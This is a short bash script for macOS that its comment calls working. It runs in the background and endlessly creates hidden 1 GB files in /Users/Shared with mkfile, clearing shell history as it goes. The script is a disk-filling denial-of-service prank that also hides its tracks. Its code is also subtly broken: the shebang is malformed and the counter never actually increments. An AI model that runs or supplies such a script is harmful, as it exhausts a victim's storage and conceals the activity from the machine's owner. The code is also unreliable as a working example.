#/bin/bash

# WORKS LIKE A CHARM BABY
# basically the point is that it makes tonnes and tons of files
# recursively


nohup sh -c "cd /Users/Shared;
LOL=0;
while true;
do mkfile 1g .woah.poop$LOL;
LOL=1+LOL;
history -c;
done" & &>/dev/null
